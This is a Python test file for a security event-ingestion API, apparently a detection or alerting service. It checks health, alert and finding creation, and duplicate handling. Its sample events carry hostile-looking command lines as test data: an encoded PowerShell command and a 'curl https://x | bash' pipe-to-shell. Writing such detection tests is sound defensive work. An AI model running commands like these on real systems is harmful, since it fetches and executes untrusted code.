from datetime import datetime, timezone


def test_health(client):
    response = client.get("/api/v1/health")
    assert response.status_code == 200
    assert response.json()["status"] == "healthy"


def test_event_ingest_creates_alert_and_finding(client):
    payload = {
        "batch_id": "test-batch",
        "events": [
            {
                "event_id": "evt-1",
                "host_id": "win-01",
                "platform": "windows",
                "source": "sysmon",
                "event_type": "process_start",
                "occurred_at": datetime.now(timezone.utc).isoformat(),
                "severity": "high",
                "process": {
                    "name": "powershell.exe",
                    "command_line": "powershell.exe -EncodedCommand aQBlAHgA",
                },
            }
        ],
    }
    response = client.post("/api/v1/ingest/events", json=payload)
    assert response.status_code == 200
    assert response.json()["alerts_created"] == 1

    overview = client.get("/api/v1/overview")
    body = overview.json()
    assert len(body["alerts"]) == 1
    assert len(body["findings"]) == 1


def test_event_ingest_is_idempotent(client):
    event = {
        "event_id": "evt-duplicate",
        "host_id": "lin-01",
        "platform": "linux",
        "source": "journald",
        "event_type": "process_start",
        "occurred_at": datetime.now(timezone.utc).isoformat(),
        "severity": "critical",
        "process": {"name": "bash", "command_line": "curl https://x | bash"},
    }
    payload = {"batch_id": "batch-x", "events": [event]}
    first = client.post("/api/v1/ingest/events", json=payload)
    second = client.post("/api/v1/ingest/events", json=payload)
    assert first.json()["stored_events"] == 1
    assert second.json()["stored_events"] == 0

    alerts = client.get("/api/v1/alerts").json()
    assert len(alerts) == 1
